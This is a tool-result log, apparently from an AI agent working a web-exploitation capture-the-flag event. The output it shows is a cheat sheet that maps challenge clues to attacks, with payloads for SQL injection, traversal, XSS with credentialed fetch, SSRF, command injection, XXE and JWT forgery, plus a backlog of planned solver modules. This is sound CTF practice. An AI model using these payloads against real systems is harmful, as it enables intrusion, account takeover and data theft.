{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01XeYdpDonHpY84584NkDUuJ","type":"tool_result","content":"<persisted-output>\nOutput too large (52.4KB). Full output saved to: /home/testpwn/.claude/projects/-home-testpwn-huntress-2026/796bd88c-889b-4ff3-9fe2-4237d9643e3d/tool-results/b6ucddway.txt\n\nPreview (first 2KB):\n  `?doc=` page with no /api/clues (handbook|notes|reader.php) = D04: read ../x5-10 run/huntress/objective.txt BY HAND now.\nONE-SHOT STATE (credits/balance/remaining in a secondary, \"race\", \"twice\") -> GET only until the burst (D21).\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\" | \"Signed in as\" + ids       -> backup | IDOR      -> Disallow -> index -> .bak (depth 2) | foreign id from /api/history\nsearch box, \"database\" | feature_route only, \"a sign\"  -> SQLi | open route  -> q=zz') OR 1=1 -- (+ quote-balanced ' \" )) #) | GET it\n?doc= (handbook|notes|reader.php), no /api/clues     -> traversal (D04)    -> ../ x10 + /run/huntress/objective.txt (never only the prompt path)\ncallback_nonce, \"repeats everything\"                   -> reflected XSS      -> ?q=<script>fetch('/cb?nonce=N')</script>, then GET /cb?nonce=N\n      with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template          -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\"                     -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, hidden csrf_token, \"even strangers\" -> CSRF (D09)         -> external option, Sec-Fetch-Site: cross-site, Mode: navigate,\n                                                                                Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route, \"standards. Low ones\"       -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\"} -> GET path\n\"evaluates everything\", empty \"Rendered message\" <pre> -> SSTI (D11)         -> ?template=a${7*7}b{{7*7}}c per param -> {{objective}}\n...\n</persisted-output>","is_error":false}]},"parent_tool_use_id":null,"session_id":"796bd88c-889b-4ff3-9fe2-4237d9643e3d","uuid":"62ae1ee2-dd5b-44f4-87c5-837276143b00","timestamp":"2026-10-31T03:39:26.607Z","tool_use_result":{"stdout":"  `?doc=` page with no /api/clues (handbook|notes|reader.php) = D04: read ../x5-10 run/huntress/objective.txt BY HAND now.\nONE-SHOT STATE (credits/balance/remaining in a secondary, \"race\", \"twice\") -> GET only until the burst (D21).\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\" | \"Signed in as\" + ids       -> backup | IDOR      -> Disallow -> index -> .bak (depth 2) | foreign id from /api/history\nsearch box, \"database\" | feature_route only, \"a sign\"  -> SQLi | open route  -> q=zz') OR 1=1 -- (+ quote-balanced ' \" )) #) | GET it\n?doc= (handbook|notes|reader.php), no /api/clues     -> traversal (D04)    -> ../ x10 + /run/huntress/objective.txt (never only the prompt path)\ncallback_nonce, \"repeats everything\"                   -> reflected XSS      -> ?q=<script>fetch('/cb?nonce=N')</script>, then GET /cb?nonce=N\n      with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template          -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\"                     -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, hidden csrf_token, \"even strangers\" -> CSRF (D09)         -> external option, Sec-Fetch-Site: cross-site, Mode: navigate,\n                                                                                Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route, \"standards. Low ones\"       -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\"} -> GET path\n\"evaluates everything\", empty \"Rendered message\" <pre> -> SSTI (D11)         -> ?template=a${7*7}b{{7*7}}c per param -> {{objective}}\n\"plant ... come back later\", post_required + rows:[]   -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"}, GET secondary\n\"binds whatever you hand it\", administrator_required   -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin, roles,..}\ninventory_route + protected_reference                  -> field/action authz -> feature?id=<protected>&fields=<f>&action=<a>, EVERY single f x a\nabsolute_url_required + secondary internal_only        -> SSRF (D15)         -> feature?url=http://127.0.0.1:8080<secondary>; ladder :80 :5000 ..\ninput_parameter + example_path, 400 path_required      -> cmd injection(D16) -> feature?<param>=<example>%3Bcat%20/run/huntress/objective.txt\nrecovery_guide_route, self_service_only                -> reset token (D17)  -> token for the self_service id, redeem it with the other account_id\nprotected_reference + note, GET 404 not_found          -> GraphQL (D18)      -> POST {\"query\":\"{__schema{..}}\"}; case(id:\"<prot>\"){id title note}\nevent_type+owner_scope, ANY generic rejection          -> alias-union (D19)  -> POST JSON {event_type,type,event: <ev>, owner_scope,scope,owner: <scope>,\n                                                                                role,current_role:\"admin\", source,sender:\"provider\", verified,signed,trusted:true}\nstate_format_route, \"sign nothing\", state_required     -> unsigned state(D20)-> GET guide; POST {<field>: b64url(sample, role=\"administrator\")} to `transport`\n\"race it\", credit_not_overspent + credits, 409         -> race (D21)         -> NO sequential POST; 24 concurrent POST {} on a barrier, GET secondary (UNSOLVED)\nstream_reference, 426 websocket_upgrade_required       -> WS stream (D22)    -> stdlib WS handshake to feature?stream=<ref> WITH Origin (none = 403); 1st frame\ndeployment: trusted_reverse_proxy, 403 loopback_only   -> proxy header (D23) -> X-Forwarded-For: 127.0.0.1 (ladder X-Real-IP, Forwarded for=, ..); evaluated_client flips\npolicy_format_route + expected_behavior, 400           -> fail-open (D24)    -> GET /api/policy-format; ?<query_parameter>=<prefix>%%%invalid (keep prefix, break\n  remote_policy_required, \"cannot be decoded\"                                   base64url) -> exceptional_condition_fail_open; the valid sample = baseline only\n\"nobody wrote it down ... logs missed\", post_required, -> logging gap (D25)  -> POST {} to feature (export_id, operation); GET secondary log (that id = page_view);\n  secondary events[] + report{method, fields}                                   POST {export_id, missing_event: <operation>, observed_event: <logged>} to secondary\ndebug/actuator/verbose 500, default config | manifest/ -> misconfig (A02) |  -> read the exposed config, use what it names | dependency/update integrity unchecked:\n  plugin/update/integrity keys, \"trusted mirror\"         supply chain (A03)    point it at an app-owned route / mismatched hash (UNSEEN, forecast D26-D31)\nrole cookie/X-*-Role | eyJ..eyJ..sig, blob + .sig      -> role | JWT/signed  -> role=administrator (cookie/header/claim) | alg none / leaked secret, re-sign, role ladder\notp/verify/step 2, \"second factor\" | ?next=/redirect_uri -> MFA skip | redirect -> final step with the step-1 session | point it at the clue route\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\nHost/X-Forwarded-Host in links, \"cache\" | 403 on route -> Host poison | path -> X-Forwarded-Host/X-Original-URL; /ROUTE, //route, /route;/, method override\nSSRF filtered (blocked_host) -> 2130706433, 127.1, [::1], allowed@127.0.0.1, file:///run/...; ACAO echoes Origin -> CORS\n/api/v1 vs /v2, \"legacy\"; EventSource/socket.io        -> shadow API / SSE   -> the protected op on every version / transport (same authz?)\nXML/SVG/DOCX upload -> XXE <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">. \"__proto__\"/JSON merge -> {\"__proto__\":{\"isAdmin\":true}}\nNEW CLASS = promote lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE ANY single submit, by-hand ones included\n(D19, D20, D23, D25 TT first try; D22, D24 TT solver_incomplete). Banners are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (D26-D31 at ~2 lane-days per day: the whole rest of the lane). \"prebuild\" = pure python handler\n(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\ndecoy. \"note\" = harness/prompt change. \"tool\" = install. None built yet (web prebuild lane exists but is opt-in; no\n`web:*` keys in .run/prebuild-state.json, checked cal. 28). After D25 (cal. 28): D24/D25 were never gaps (fail-open\nand logging failure were the OWASP 2025 A10/A09 newcomers; now seen, rows 47a/48). Added: `owasp2025-remaining-\ncategories` (note), `security-misconfig-probe`, `supply-chain-integrity`, `default-creds-login`, `format-guide-mutator`\n(P1), `exceptional-condition-sequels` (P2). Raised to 1: `crypto-weak-token-derivation`, `vcs-debug-leak-reader`\n(A04/A02 unseen). Lowered to 2 (no OWASP 2025 slot left for them, or already covered by lib/web):\n`path-verb-normalization-bypass`, `business-logic-tamper`, `alias-union-body-builder`, `dom-xss-sink-scan`,\n`open-redirect-planner`, `prototype-pollution`, `api-shadow-version`, `nosql-operator-injection`,\n`clue-json-router`, `mastery-concept-dispatcher`, `fetch-metadata-matrix`, `stopgate-503-already-solved`.\n`log-injection-forging` 3 -> 2 (A09 sibling). `mastery-prompt-free-defaults` and `codify-before-tt` both REGRESSED\nagain on cal. 28. Dropped after D23 (cal. 27): `websocket-authz` (seen D22 -> `sse-socketio-transport`), `header-trust-verb-path-bypass`\n(header half seen D23 -> `path-verb-normalization-bypass`), `logic-race-reset` (race seen D21, unsolved ->\n`race-burst-first-dispatch` note + `business-logic-tamper`). Added: `mastery-prompt-free-defaults`. Raised to 1:\n`cache-host-header`, `cors-misconfig-probe`, `codify-before-tt` (regressed on D22). Lowered to 2: webhook / SSRF /\ndeserialization sequels (new concepts beat sequels since D19). Dropped after D13: `ssti-engine-probe`, `port-day22-handlers`. After D15:\n`ssrf-planner`. After D18: `cmd-injection-planner`, `graphql-introspection`. After D20: `api-unsafe-consumption`\n(seen D19 -> `webhook-signature-sequels`); `deserialization-gadgets` narrowed to native/signed formats (unsigned JSON\nstate seen D20); `codify-before-tt` lowered to 2 (fixed on D19-D20). Added after D20: `webhook-signature-sequels`,\n`alias-union-body-builder`, `crypto-weak-token-derivation`, `known-vulnerable-component`, `log-injection-forging`;\nraised: `jwt-session-forge` (first), `role-tamper-planner` detail (role ladder).\n\n```json\n[\n  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: the web prebuild lane exists but is opt-in (HCTF_PREBUILD_WEB=1)\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Partly done on D25: hctf/prebuild.py LANES now has `web` (brief prebuild_web, writable lib/web/handlers/prebuilt/ + tests/data/web_fixtures/, targets tests/data/web_fixtures/TARGETS.json, offline gate tests/test_web_fixtures.py, requires lib/web/handlers/__init__.py:_load_plugins + lib/web/handlers/prebuilt/__init__.py) but it is OPT-IN: AUTO_LANES only appends web when HCTF_PREBUILD_WEB=1 (or HCTF_PREBUILD_LANES lists it). After D20 lib/web/handlers/prebuilt/ still holds only __init__.py and .run/prebuild-state.json has no web:* keys -> nothing below has drained. Owner of the nightly batch: set HCTF_PREBUILD_WEB=1 (or add web to the default AUTO_LANES) so the prebuild gaps below get built; fixtures = saved target responses (targets 410 after CORRECT).\"},\n  {\"id\": \"race-burst-first-dispatch\", \"concept\": \"one-shot race targets must get the concurrent burst before ANY sequential POST (row 26)\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D21 Double Spent single was never solved: at the workers' first GET the secondary already said credit_not_overspent credits:0 and every POST -> 409 credit_unavailable (sequential, 8x curl, 10x HTTP/2, 24x barrier). The race_bisect / prior-solver dry run ran 16 s on the fresh target (13:00:43-13:00:59) and its default ladder + D12/D13/D19 handlers POST to feature_route, which spends the one credit. Owner of lib/web + hctf: (1) promote challenges/day27/web-double-spent/solver/day27_web_double_spent.plugin_draft.py (GET gate on the secondary, barrier-synced ~24 POST {} burst, GET secondary) as lib/web/handlers/day27_web_double_spent.py; (2) in lib/web candidates(), when any GET body says credit_not_overspent / credits / balance / remaining, run ONLY the race handler first; (3) race_bisect / dry runs must be GET-only on web targets (or skip web). Matters for every future Mastery that deals a D21 target. Record the success effect spelling when it lands.\"},\n  {\"id\": \"mastery-prompt-free-defaults\", \"concept\": \"earlier-day web solvers must not derive parameters from the Mastery prompt\", \"priority\": 1, \"action\": \"note\", \"detail\": \"STILL UNFIXED after cal. 28: all FOUR Mastery runs of cal. 27-28 (D22, D23, D24, D25) went 4/5 with proof-4 = a D04 Stay in Your Directory target (PHP 8.3, `/` 302 -> `handbook.php` | `notes.php` | `reader.php` (new cal. 28) `?doc=<x>.php`, no /api/clues, proof in <article>); each was hand-solved with `<entry>?doc=../../../../../run/huntress/objective.txt` 1-2 min later. Cause unchanged: challenges/day20/web-stay-in-your-directory/solver/solve.py lfi() builds its path list from a regex over the PROMPT (`/run|/etc|..`) and otherwise uses only `/flag.txt`; the Mastery prompt is today's. Fix (owner of lib/web or that solver): always append /run/huntress/objective.txt (and read /run/huntress/config.json for classification); also make the lib/web dispatcher route a no-/api/clues PHP page with a `?doc=`-style link straight to the traversal handler first, so the ~60 s solver budget is not spent elsewhere. Audit the other earlier-day solvers for the same prompt dependence.\"},\n  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"REGRESSED AGAIN on cal. 28 (D24 Fail Open Friday): the answer-first worker submitted a by-hand proof 41 s after start, which unlocked TT at once; the plugin day28_web_fail_open_friday.py landed ~28 s after TT start -> TT solver_incomplete (live worker CORRECT ~42 s after TT start). D25 promoted its plugin before submit -> TT first try (solve 5 s). Cal. 27: D22 plugin 20 s late -> TT solver_incomplete; D23 in time -> 10.5 s. Fix: the single submit (by ANY worker, answer-first included) must wait until the class plugin is importable and has returned the same proof on the live target, OR TT start must be gated on it. Earlier: TT solver_incomplete on D09, D10, D12, D13, D15-D18; fixed on D19-D20 by the 45 s grace at CORRECT.\"},\n  {\"id\": \"runtime-config-oracle\", \"concept\": \"/run/huntress/config.json names the weakness once any file read works\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D16's `cat /run/huntress/*` printed config.json {schema: huntress.web_exploitation.runtime_config.v1, profile_id: framework_<lang>_<fw>_<weakness>, framework_cell, weakness: os_command_injection, mode: single|time_trial|mastery, layout...} next to objective.txt. Owner of lib/web: after any handler achieves a file read (LFI D04, cmd D16, SSTI file read, XXE, SSRF file://), also read /run/huntress/config.json and log `weakness`/`profile_id` -- a free classifier for unknown Mastery targets and for the codify worker's KEY_MAP. Never submit anything from it; the proof is still objective.txt.\"},\n  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Still unseen after D25 (OWASP 2025 A04/A07 territory, both open) -- the biggest remaining session/integrity class. D20 'Serialized Offender' was the UNSIGNED form (`{state: b64url(JSON)}`, 'sign nothing'); the signed-but-weak sequel is the most likely next session/integrity day. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig, dropped sig segment), HS256 re-signed with secrets FOUND in recon (clues, *_guide/format routes, backups, .env, JS, comments, `kid` pointing at a readable file), RS256->HS256 with a published public key (jwks.json / *.pem route), jku/x5u to an app-owned route. Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1); Express `s:<val>.<sig>` (HMAC-SHA256 base64 no padding); generic `<b64 JSON>.<hex hmac>` blobs. Escalate with the D20 role ladder (administrator, admin, superuser, root, owner) on every `*role*`/`is_admin` claim, keep other claims. Reuse D20's format-guide reading (transport, request_field, encoding). No secret brute force beyond what the app leaks.\"},\n  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised after D23 (proxy-trust day): the same 'trusted proxy' kit with another header family is the natural sequel -- X-Forwarded-Host / X-Host / X-Forwarded-Proto / X-Original-URL / X-Rewrite-URL one at a time against the feature route, and Host-poisoned reset/callback links. Reuse D23's error shape: a JSON error that echoes what the app evaluated (`evaluated_client`) tells which header bound. Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"},\n  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised after D22: the WS handshake was gated only on an Origin header being PRESENT (own or foreign accepted) -- the origin-trust family is live in this kit. Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n  {\"id\": \"mfa-step-skip-auth-flow\", \"concept\": \"auth-flow sequels: MFA/OTP step skip, Host-header reset link, leaked/reused codes, login state machine (row 27b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"A07:2025 Authentication Failures is the only 2025 category touched just once (D17) -- keep priority 1. D17 (reset token not bound to account) was the first authentication-flow day (OWASP API2). Planner over a guide/clue JSON or form chain: identify steps (login -> otp/verify -> session; request -> email/preview -> redeem); try calling the final step with the step-1 state (cookie/token) and no code, an empty/null/array code, the code issued to OUR account on another account_id/username, a code echoed in any response, a step-2 response flag (`mfa_required:false`, `verified:true`) set in the JSON body; reset links built from X-Forwarded-Host / Host to a route we can read. Parameter names from the guide (`account_parameter`, `token_parameter`, `code`, `otp`). Parser: proof regex / evidence. No brute force of codes.\"},\n  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON shows current_role: analyst. D13 granted admin via JSON body binding, D20 via a role field inside an unsigned state blob -- and D20 accepted ONLY `administrator` (`admin`, `ADMIN`, `staff`, flags -> role_not_permitted). Remaining forms: cookie role=<value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role= / ?admin=1, PATCH/PUT of the profile route. Value ladder, one request each: administrator, admin, superuser, root, owner, staff, manager, plus any higher value the app lists; `role_not_permitted` = right field, keep laddering. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised to 1 after cal. 28: OWASP 2025 A02 Security Misconfiguration is unseen and a likely D26-D31 day; see also security-misconfig-probe. Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n  {\"id\": \"crypto-weak-token-derivation\", \"concept\": \"crypto failures: tokens derivable from data the app shows (row 45, OWASP A02)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised to 1 after cal. 28: OWASP 2025 A04 Cryptographic Failures is unseen while D24/D25 took A10/A09 -- pair with jwt-session-forge. OWASP A02 is the largest untouched Top-10 area. Planner over every token/id the app issues to US (reset tokens like D17's 12 hex, session ids, invite codes, receipt ids): test whether it equals md5/sha1/sha256 of (username|account_id|email|timestamp|id), truncated, hex/base64; sequential/time-based ids; then derive the victim's token from the victim's id/label shown in a guide. ECB-style cookies: repeated 16-byte blocks -> cut-and-paste a role block; CBC bit-flip on a known plaintext field. Only derivations from values the app shows; no brute force.\"},\n  {\"id\": \"owasp2025-remaining-categories\", \"concept\": \"forecast: D24/D25 took OWASP Top 10:2025's A10 and A09; D26-D31 likely cover A02, A03, A04, A07\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Cal. 28 showed the tail of the lane walking OWASP Top 10:2025: D24 Fail Open Friday = A10 Mishandling of Exceptional Conditions (new in 2025), D25 If a Breach Falls in a Log = A09 Security Logging & Alerting Failures. Earlier days covered A01 (D02, D05, D14, D18), A05 Injection (D03, D11, D12, D16), A06 Insecure Design (D21 race), A08 Integrity (D19, D20). Unseen: A02 Security Misconfiguration (security-misconfig-probe, vcs-debug-leak-reader, cors-misconfig-probe, xxe-payloads), A03 Software Supply Chain Failures (supply-chain-integrity, known-vulnerable-component), A04 Cryptographic Failures (jwt-session-forge, crypto-weak-token-derivation), A07 Authentication Failures (default-creds-login, mfa-step-skip-auth-flow). Workers: when a prompt reads like an OWASP category description, map it to the category first, then to the gap's first move. Recent kits self-document: a *_format_route guide or a `report{method, fields}` schema tells you the exact request.\"},\n  {\"id\": \"security-misconfig-probe\", \"concept\": \"security misconfiguration: debug mode, verbose errors, default config, exposed admin/console, directory listing (row 49, OWASP A02:2025)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Unseen 2025 category, likely D26-D31. Kit guess: clue value like `environment: development` / `debug: true` / `config_route`, or a feature that 500s with a stack trace. Pure planner over recon bodies: GET (capped, once each) /debug, /actuator, /actuator/env, /actuator/configprops, /console, /server-status, /server-info, /phpinfo.php, /.env, /config.json, /api/config, /trace, /_profiler, /elmah.axd, /swagger-ui, directory listing on any clue route's parent; force a verbose error (wrong type, missing field, Accept: text/html) on each clue route and parse the 500 body for secrets/keys/hidden routes. Use what it reveals: a debug toggle param (?debug=1, X-Debug: 1), an admin route, a default/dev credential, a signing secret (hand to jwt-session-forge). Parser: proof regex + secret/route extraction. GET only; no scanning beyond this list.\"},\n  {\"id\": \"supply-chain-integrity\", \"concept\": \"software supply chain: dependency / plugin / update fetched or installed without integrity verification (row 50, OWASP A03:2025)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Unseen 2025 category, likely D26-D31. Kit guess (same style as D24's guide): a `*_manifest_route` / `package_route` / `registry` / `update_route` clue whose guide documents {source, name, version, integrity/sha256, signature}; the feature installs/loads what you point it at. Planner: replay the documented sample (baseline), then one change at a time: source/registry URL -> an app-owned route (secondary_route, /api/clues) or a higher version of the same name (dependency confusion), integrity/sha256 mismatched / empty / removed / algorithm swapped (sha256 -> md5/none), signature missing, version pinned -> `latest` / `*`, script tag without SRI. Effect JSON + evidence expected. Reuse the D20/D24 format-guide reader. Parser: proof regex.\"},\n  {\"id\": \"default-creds-login\", \"concept\": \"default / documented / leaked credentials (row 14, OWASP A07:2025)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"A07 touched only by D17. Planner: collect credential-shaped pairs the app itself shows (HTML comments, JS literals, *_guide/format routes, README/backup files, error messages, 'factory settings'/'setup' pages, the framework's documented defaults table for the CURRENT banner only: admin/admin, admin/password, root/root, guest/guest, tomcat/tomcat, etc. -- at most ~8 tries, no brute force). Login endpoints from forms / clues / openapi; JSON then form body. After login, GET the secondary/admin route. Parser: proof regex; session cookie carried.\"},\n  {\"id\": \"format-guide-mutator\", \"concept\": \"generic *_format_route / *_guide_route reader: replay the documented sample, then mutate one field (D20 data tamper, D24 malformed input)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Two days (D20 /api/state-format, D24 /api/policy-format) shipped a JSON guide describing the exact request: {transport | query_parameter | request_field, prefix, encoding ('base64url of UTF-8 JSON' / 'base64url UTF-8 JSON'), sample_state | sample_decision, sample_encoded}. Pure planner: input = guide JSON + clues (incl. any value key such as expected_behavior); output = ordered request list: (1) the sample as documented (baseline; never a solve), (2) DATA mutations (role/scope/allow/admin ladder: administrator, admin, ...; allow true; scope private/internal/admin), (3) FORMAT mutations keeping the prefix: undecodable payload (%%%invalid, !!!), truncated, empty, valid base64 of non-JSON, JSON of wrong type ([], 1, null), missing prefix, unknown prefix/version, oversized. Encoding per guide (b64url no padding). Parser: proof regex. Covers D20/D24 and their sequels with one module.\"},\n  {\"id\": \"path-verb-normalization-bypass\", \"concept\": \"HTTP verb / method override and path-normalisation authz bypass (rows 16, 17)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D23 took the header half of the old 'header-trust-verb-path-bypass' gap (seen). The other two classic 403-bypass families remain and fit a 'protected path' kit (D23's prompt: 'stroll down the protected path'). Pure planner for a route that 401/403/405s: methods HEAD/POST/PUT/PATCH/OPTIONS/TRACE + X-HTTP-Method-Override / X-Method-Override / _method=; path variants /ROUTE upper-case, trailing /, /., //route, /./route, /route;/, /route..;/, %2e/%2f/%61 single-char encodings, trailing ?/#, X-Original-URL / X-Rewrite-URL with a harmless base path. Parser: proof regex; diff status/body against the baseline 403 and stop at the first 200 with evidence.\"},\n  {\"id\": \"business-logic-tamper\", \"concept\": \"business-logic sequels: negative/huge amounts, price in the body, coupon replay, step reorder (row 26b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D21 showed a ledger kit (feature POST spends credits, secondary audits the balance). Sibling flaws a sequel day would use: quantity/amount -1, 0, 1e9, 0.0001, strings ('1e3'), a client-sent price/total field, a redeem/coupon token replayed or applied twice sequentially, a checkout/approval step called out of order. Planner input = guide/clue JSON + one observed request body; output = <= 12 single-change JSON bodies, GET secondary after each. GET-only recon first (one-shot state, see race-burst-first-dispatch). Parser: proof regex.\"},\n  {\"id\": \"alias-union-body-builder\", \"concept\": \"one JSON body carrying every clue value under every plausible alias + privilege/trust flags\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D19 lost ~60 s across three workers bisecting ~30 narrow bodies against a sink whose only error was webhook_rejected; the answer-first worker's kitchen-sink body landed first try in single/TT/Mastery. Pure builder: input = clue JSON (minus route keys) + optional guide sample; output = ordered list of JSON bodies: (1) union body: each value under its key and aliases (event_type/type/event/kind/action/topic/name; owner_scope/scope/owner/tenant; user/username/account/account_id; id/case_id/reference) + role/current_role/user_role 'admin' and 'administrator' variants + source/sender/provider/origin 'provider' + verified/signed/trusted/authenticated true; (2) nested variants {event:{..}}, {data:{..}}, {payload:{..}}; (3) per-field bisect list only after a hit. Never arrays at top level (D19 500). Reusable for any POST sink with a generic error (D12/D13/D19 shapes).\"},\n  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo,","stderr":"","interrupted":false,"isImage":false,"noOutputExpected":false,"persistedOutputPath":"/home/testpwn/.claude/projects/-home-testpwn-huntress-2026/796bd88c-889b-4ff3-9fe2-4237d9643e3d/tool-results/b6ucddway.txt","persistedOutputSize":53696},"tool_result_meta":[{"id":"toolu_01XeYdpDonHpY84584NkDUuJ","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
